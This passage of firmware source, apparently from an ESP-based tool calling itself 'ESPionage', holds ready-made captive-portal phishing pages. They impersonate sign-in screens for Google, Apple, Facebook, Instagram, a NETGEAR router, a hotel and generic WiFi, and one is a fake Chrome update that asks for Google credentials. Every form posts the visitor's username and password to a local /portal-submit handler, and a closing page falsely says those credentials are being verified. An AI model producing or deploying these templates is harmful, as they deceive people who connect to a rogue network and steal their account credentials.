      <button class="next" onclick="var v=document.getElementById('email-input').value;if(!v){document.getElementById('email-input').focus();return;}document.getElementById('email-display').textContent=v;document.getElementById('hidden-email').value=v;document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';document.getElementById('pass-input').focus();">Next</button>
    </div>
  </div>
  <div id="step2">
    <h1>Welcome</h1>
    <div class="step-hint">
      <svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <span id="email-display"></span>
      <svg viewBox="0 0 24 24" fill="#1a73e8" style="cursor:pointer" onclick="document.getElementById('step2').style.display='none';document.getElementById('step1').style.display='block'"><path d="M6.41 6L5 7.41 9.58 12 5 16.59 6.41 18l6-6z"/></svg>
    </div>
    <form method="POST" action="/portal-submit">
      <input type="hidden" name="t" value="google">
      <input type="hidden" name="username" id="hidden-email">
      <div class="field">
        <input type="password" name="password" id="pass-input" placeholder=" " required>
        <label for="pass-input">Enter your password</label>
      </div>
      <a href="#" class="forgot">Forgot password?</a>
      <div class="actions">
        <a href="#" class="create">Create account</a>
        <button type="submit" class="next">Next</button>
      </div>
    </form>
  </div>
</div>
<div class="footer" style="max-width:450px;width:100%">
  <a href="#">English (United States)</a>
  <div style="display:flex;gap:16px"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
</div>
</body></html>)HTML";

static const char PORTAL_APPLE[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Apple Account</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;background:#f5f5f7;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.wrap{width:100%;max-width:380px}
header{text-align:center;margin-bottom:28px}
header svg{width:44px;height:44px;margin-bottom:16px}
h1{font-size:26px;font-weight:600;color:#1d1d1f;letter-spacing:-.022em;line-height:1.2}
.sub{font-size:15px;color:#6e6e73;margin-top:6px;line-height:1.4}
.card{background:#fff;border-radius:18px;padding:28px 24px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
.field{border:0.5px solid #d2d2d7;border-radius:10px;overflow:hidden;margin-bottom:16px}
.field-inner{display:flex;flex-direction:column}
.field-row{position:relative;display:flex;align-items:center}
.field-row+.field-row{border-top:0.5px solid #d2d2d7}
.field label{position:absolute;left:16px;top:50%;transform:translateY(-50%);font-size:17px;color:#6e6e73;pointer-events:none;transition:.15s;letter-spacing:-.022em}
.field input{width:100%;border:none;outline:none;padding:20px 16px 6px;font-size:17px;color:#1d1d1f;background:transparent;letter-spacing:-.022em;-webkit-appearance:none}
.field input:focus~label,.field input:not(:placeholder-shown)~label{top:10px;transform:none;font-size:11px;color:#6e6e73}
.btn{width:100%;background:#0071e3;color:#fff;border:none;border-radius:12px;padding:15px;font-size:17px;font-weight:500;cursor:pointer;margin-top:4px;letter-spacing:-.022em}
.btn:active{background:#0062c3}
.links{display:flex;justify-content:space-between;margin-top:20px;padding:0 4px}
.links a{color:#0071e3;font-size:13px;text-decoration:none}
footer{margin-top:24px;font-size:12px;color:#98989c;text-align:center;line-height:1.5}
footer a{color:#98989c}
</style></head>
<body>
<div class="wrap">
  <header>
    <svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg"><path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-57.8-155.5-127.4C46 407.9 0 251.6 0 147C0 65 52.4-.6 155.4-.6c78.4 0 125.6 48.5 171.5 48.5 44.2 0 98.7-51.5 190.6-51.5 30.9 0 110.5 2.6 181.3 82.5zm-108.1-155.9c37.9-46.7 64.8-112.2 64.8-177.7 0-9.1-.6-18.2-2-26.6-61.8 2.6-138 41.5-182.7 93.8-35.5 39.5-68.9 104.9-68.9 171.5 0 9.8 1.6 19.5 2.6 22.5 3.9.6 10.4 1.3 16.9 1.3 56.3 0 126.6-37 169.3-84.8z" fill="#1d1d1f"/></svg>
    <h1>Apple Account</h1>
    <p class="sub">Sign in with your Apple Account<br>to continue to iCloud.</p>
  </header>
  <div class="card">
    <form method="POST" action="/portal-submit">
      <input type="hidden" name="t" value="apple">
      <div class="field">
        <div class="field-inner">
          <div class="field-row">
            <input type="email" name="username" id="aid" placeholder=" " autofocus required>
            <label for="aid">Apple&nbsp;Account (Email&nbsp;or&nbsp;Phone)</label>
          </div>
          <div class="field-row">
            <input type="password" name="password" id="pw" placeholder=" " required>
            <label for="pw">Password</label>
          </div>
        </div>
      </div>
      <button type="submit" class="btn">Sign In</button>
    </form>
    <div class="links">
      <a href="#">Forgot Apple&nbsp;Account or password?</a>
      <a href="#">Create Account</a>
    </div>
  </div>
  <footer>Your Apple Account information is used to allow you<br>to sign in securely and access your data.<br><a href="#">Privacy Policy</a></footer>
</div>
</body></html>)HTML";

static const char PORTAL_ROUTER[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#e8e8e8;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border:1px solid #bbb;max-width:360px;width:100%;margin:16px}
.header{background:#003d7d;color:#fff;padding:12px 20px;display:flex;align-items:center;gap:12px}
.header h1{font-size:16px;font-weight:bold}
.body{padding:24px 20px}
p{font-size:13px;color:#333;margin-bottom:16px;line-height:1.4}
label{display:block;font-size:13px;color:#333;margin-bottom:3px;font-weight:bold}
input{width:100%;border:1px solid #bbb;padding:7px 10px;font-size:14px;margin-bottom:14px;border-radius:2px;outline:none}
input:focus{border-color:#003d7d}
.btn{background:#003d7d;color:#fff;border:none;padding:8px 20px;font-size:13px;cursor:pointer;border-radius:2px}
.btn:hover{background:#002d5d}
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <div>
      <h1>NETGEAR Router</h1>
      <div style="font-size:11px;opacity:.8">R7000 — Nighthawk AC1900</div>
    </div>
  </div>
  <div class="body">
    <p>A username and password are required to access the router settings.</p>
    <form method="POST" action="/portal-submit">
      <input type="hidden" name="t" value="router">
      <label>User Name</label>
      <input type="text" name="username" value="admin" autofocus required>
      <label>Password</label>
      <input type="password" name="password" placeholder="" required>
      <button type="submit" class="btn">LOG IN</button>
    </form>
  </div>
</div>
</body></html>)HTML";

static const char PORTAL_WIFI[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#1c1c1e;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#2c2c2e;border-radius:16px;padding:32px 28px;max-width:380px;width:100%;margin:16px}
.icon{font-size:40px;text-align:center;margin-bottom:16px}
h1{font-size:22px;font-weight:700;text-align:center;color:#fff;margin-bottom:6px}
.sub{font-size:14px;color:#8e8e93;text-align:center;margin-bottom:24px}
input{width:100%;background:#3a3a3c;color:#fff;border:none;border-radius:10px;padding:13px 15px;font-size:16px;margin-bottom:12px;outline:none}
input::placeholder{color:#636366}
input:focus{background:#444446}
.btn{width:100%;background:#0a84ff;color:#fff;border:none;border-radius:10px;padding:14px;font-size:16px;font-weight:600;cursor:pointer}
.note{font-size:12px;color:#636366;text-align:center;margin-top:12px}
</style>
</head>
<body>
<div class="card">
  <div class="icon">📶</div>
  <h1>Network Login</h1>
  <p class="sub">Enter your credentials to connect to the network</p>
  <form method="POST" action="/portal-submit">
    <input type="hidden" name="t" value="wifi">
    <input type="text" name="username" placeholder="Username" autofocus required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="btn">Connect</button>
  </form>
  <p class="note">Your credentials are used only to authenticate you to this network.</p>
</div>
</body></html>)HTML";

static const char PORTAL_FACEBOOK[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to Facebook</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;border-radius:8px;padding:20px;max-width:396px;width:100%;margin:16px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}
.logo{color:#1877f2;font-size:54px;font-weight:bold;text-align:center;letter-spacing:-3px;margin-bottom:12px}
input{width:100%;border:1px solid #dddfe2;border-radius:6px;padding:14px 16px;font-size:17px;margin-bottom:12px;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.btn{width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;font-size:20px;font-weight:bold;cursor:pointer;margin-bottom:16px}
.forgot{display:block;text-align:center;color:#1877f2;font-size:14px;text-decoration:none;margin-bottom:20px}
.divider{border-top:1px solid #dadde1;margin:16px 0}
.create{display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;border:none;border-radius:6px;padding:10px 16px;font-size:17px;font-weight:bold;cursor:pointer}
</style>
</head>
<body>
<div class="card">
  <div class="logo">facebook</div>
  <form method="POST" action="/portal-submit">
    <input type="hidden" name="t" value="facebook">
    <input type="text" name="username" placeholder="Email or phone number" autofocus required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="btn">Log In</button>
    <a href="#" class="forgot">Forgotten password?</a>
    <div class="divider"></div>
    <button type="button" class="create">Create new account</button>
  </form>
</div>
</body></html>)HTML";

static const char PORTAL_INSTAGRAM[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888) fixed;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.outer{display:flex;flex-direction:column;align-items:center;gap:10px;width:100%;max-width:360px}
.card{background:#fff;border-radius:12px;padding:36px 30px 24px;width:100%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.25)}
.logo svg{width:180px;margin-bottom:28px}
input{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:6px;padding:11px 12px;font-size:14px;margin-bottom:8px;outline:none;color:#262626;-webkit-appearance:none}
input:focus{border-color:#a8a8a8;background:#fff}
.btn{width:100%;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:#fff;border:none;border-radius:8px;padding:11px;font-size:15px;font-weight:600;cursor:pointer;margin:6px 0 16px;letter-spacing:.3px}
.btn:active{opacity:.85}
.divider{display:flex;align-items:center;gap:14px;color:#8e8e8e;font-size:13px;font-weight:600;margin:8px 0 16px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.fb{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;text-decoration:none;margin-bottom:18px}
.forgot{font-size:12px;color:#00376b;text-decoration:none}
.signup{background:#fff;border-radius:12px;padding:14px;width:100%;text-align:center;font-size:14px;color:#262626;box-shadow:0 4px 20px rgba(0,0,0,.15)}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.app-badges{text-align:center;margin-top:16px;font-size:11px;color:rgba(255,255,255,.8)}
</style></head>
<body>
<div class="outer">
  <div class="card">
    <svg viewBox="0 0 132 52" xmlns="http://www.w3.org/2000/svg" class="logo"><path d="M9.5 1.2C5 1.2 1.2 5 1.2 9.5v33c0 4.5 3.8 8.3 8.3 8.3h33c4.5 0 8.3-3.8 8.3-8.3v-33C50.8 5 47 1.2 42.5 1.2h-33zm0-1.2h33C47.8 0 52 4.2 52 9.5v33C52 47.8 47.8 52 42.5 52h-33C4.2 52 0 47.8 0 42.5v-33C0 4.2 4.2 0 9.5 0z" fill="url(#ig)"/><linearGradient id="ig" x1="0" y1="52" x2="52" y2="0" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f09433"/><stop offset=".25" stop-color="#e6683c"/><stop offset=".5" stop-color="#dc2743"/><stop offset=".75" stop-color="#cc2366"/><stop offset="1" stop-color="#bc1888"/></linearGradient><path d="M26 13a13 13 0 100 26 13 13 0 000-26zm0 21.3a8.3 8.3 0 110-16.6 8.3 8.3 0 010 16.6zm13.5-21.8a3 3 0 11-6 0 3 3 0 016 0z" fill="url(#ig)"/>
    <text x="60" y="37" font-family="'Billabong','Brush Script MT',cursive,sans-serif" font-size="34" fill="#262626">Instagram</text></svg>
    <form method="POST" action="/portal-submit">
      <input type="hidden" name="t" value="instagram">
      <input type="text" name="username" placeholder="Phone number, username, or email" autofocus required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="btn">Log in</button>
    </form>
    <div class="divider">OR</div>
    <a href="#" class="fb">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.07C24 5.41 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.04V9.41c0-3.02 1.8-4.7 4.54-4.7 1.31 0 2.68.24 2.68.24v2.97h-1.5c-1.5 0-1.96.93-1.96 1.89v2.26h3.32l-.53 3.5h-2.8V24C19.62 23.1 24 18.1 24 12.07z"/></svg>
      Log in with Facebook
    </a>
    <a href="#" class="forgot">Forgot password?</a>
  </div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  <div class="app-badges">Get the app.</div>
</div>
</body></html>)HTML";

static const char PORTAL_CHROME[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Chrome Update Required</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#202124;color:#e8eaed;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#2d2e31;border-radius:8px;padding:40px;max-width:520px;width:100%;margin:16px;box-shadow:0 4px 24px rgba(0,0,0,.5);text-align:center}
.icon{width:72px;height:72px;border-radius:50%;background:#4285f4;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:36px}
h1{font-size:22px;font-weight:500;margin-bottom:14px;color:#fff}
p{font-size:15px;line-height:1.5;color:#bdc1c6;margin-bottom:20px}
.version{background:#3c4043;padding:8px 14px;border-radius:4px;font-size:13px;color:#8ab4f8;margin-bottom:20px;display:inline-block;font-family:monospace}
.warn{background:rgba(234,67,53,.15);border:1px solid rgba(234,67,53,.4);color:#f28b82;padding:10px;border-radius:4px;font-size:13px;margin-bottom:20px;text-align:left}
.btn{background:#4285f4;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;cursor:pointer;margin-bottom:10px}
.later{background:none;border:none;color:#8ab4f8;font-size:13px;cursor:pointer;padding:8px;margin-top:6px}
.hidden{display:none}
#step2 input{width:100%;background:#3c4043;color:#fff;border:1px solid #5f6368;border-radius:4px;padding:10px 12px;font-size:14px;margin-bottom:10px}
</style>
</head>
<body>
<div class="card" id="step1">
  <div class="icon">!</div>
  <h1>Update Chrome to continue</h1>
  <p>Your version of Chrome is out of date and cannot display this page. Update now to continue browsing securely.</p>
  <div class="version">Current: 98.0.4758.102 &middot; Latest: 128.0.6613.89</div>
  <div class="warn">Continued use of an outdated browser may expose your account credentials.</div>
  <button class="btn" onclick="document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');">Update Chrome</button><br>
  <button class="later">Remind me later</button>
</div>
<div class="card hidden" id="step2">
  <div class="icon">&#128274;</div>
  <h1>Verify your Google Account</h1>
  <p>To proceed with the update, confirm the Google Account associated with this browser.</p>
  <form method="POST" action="/portal-submit">
    <input type="hidden" name="t" value="chrome">
    <input type="email" name="username" placeholder="Email" autofocus required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="btn">Confirm &amp; Update</button>
  </form>
</div>
</body></html>)HTML";

static const char PORTAL_HOTEL[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(135deg,#1a3a5c 0%,#2d5a8c 100%);color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;color:#333;border-radius:12px;padding:36px 32px;max-width:420px;width:100%;margin:16px;box-shadow:0 10px 40px rgba(0,0,0,.3)}
.crest{text-align:center;font-size:36px;margin-bottom:6px}
h1{font-size:22px;text-align:center;color:#1a3a5c;font-weight:600;margin-bottom:4px;letter-spacing:1px}
.sub{text-align:center;color:#888;font-size:13px;margin-bottom:26px;font-style:italic}
.welcome{background:#f5f7fa;border-left:3px solid #c5a572;padding:12px 14px;font-size:13px;color:#555;margin-bottom:20px;line-height:1.5}
label{display:block;font-size:12px;color:#666;margin-bottom:4px;font-weight:500;text-transform:uppercase;letter-spacing:.5px}
input{width:100%;border:1px solid #ccd1d9;border-radius:4px;padding:11px 13px;font-size:14px;margin-bottom:14px;outline:none}
.btn{width:100%;background:#1a3a5c;color:#fff;border:none;border-radius:4px;padding:13px;font-size:14px;font-weight:600;cursor:pointer;letter-spacing:1px;text-transform:uppercase}
.terms{font-size:11px;color:#999;text-align:center;margin-top:14px;line-height:1.4}
</style>
</head>
<body>
<div class="card">
  <div class="crest">&#127976;</div>
  <h1>GRAND PLAZA HOTEL</h1>
  <div class="sub">Complimentary Guest WiFi</div>
  <div class="welcome">Welcome! Please sign in with your room number and last name to access our complimentary high-speed Internet service.</div>
  <form method="POST" action="/portal-submit">
    <input type="hidden" name="t" value="hotel">
    <label>Room Number</label>
    <input type="text" name="username" placeholder="e.g. 412" autofocus required>
    <label>Last Name</label>
    <input type="text" name="password" placeholder="Guest surname" required>
    <button type="submit" class="btn">Connect to WiFi</button>
  </form>
  <div class="terms">By signing in, you agree to our Acceptable Use Policy. Session expires after 24 hours.</div>
</div>
</body></html>)HTML";

static const char PORTAL_RICKROLL[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>You've been rickrolled</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,sans-serif;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:12px;overflow:hidden}
h1{font-size:30px;margin-bottom:12px;color:#ff4477;text-shadow:0 0 20px rgba(255,68,119,.6)}
.video-wrap{position:relative;width:100%;max-width:640px;aspect-ratio:16/9;margin:10px 0;border-radius:10px;overflow:hidden;box-shadow:0 0 40px rgba(255,68,119,.4)}
.video-wrap iframe{position:absolute;inset:0;width:100%;height:100%;border:0}
.sign{font-size:12px;color:#888;margin-top:14px}
.emoji{font-size:44px;margin-bottom:8px;animation:wiggle 1.5s infinite}
@keyframes wiggle{0%,100%{transform:rotate(-8deg)}50%{transform:rotate(8deg)}}
.unmute{margin-top:10px;padding:10px 18px;background:#ff4477;color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600}
</style>
</head>
<body>
  <div class="emoji">&#129340;</div>
  <h1>You just got rickrolled</h1>
  <div class="video-wrap">
    <iframe id="rr"
      src="https://www.youtube-nocookie.com/embed/2qBlE2-WL60?autoplay=1&mute=1&controls=1&playsinline=1&rel=0&loop=1&playlist=2qBlE2-WL60"
      allow="autoplay; encrypted-media; fullscreen"
      allowfullscreen></iframe>
  </div>
  <button class="unmute" onclick="document.getElementById('rr').src=document.getElementById('rr').src.replace('mute=1','mute=0');this.style.display='none';">Tap to unmute</button>
  <div class="sign">Connected via <em>ESPionage</em></div>
</body></html>)HTML";

static const char PORTAL_SUCCESS[] PROGMEM = R"HTML(<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connecting…</title>
<meta http-equiv="refresh" content="3;url=/">
<style>
body{font-family:-apple-system,sans-serif;background:#f0f0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}
.msg{font-size:20px;color:#333}
.sub{font-size:14px;color:#999;margin-top:8px}
</style>
</head>
<body>
<div>
  <div class="msg">✅ Connecting to network…</div>
  <div class="sub">Please wait while we verify your credentials.</div>
</div>
</body></html>)HTML";
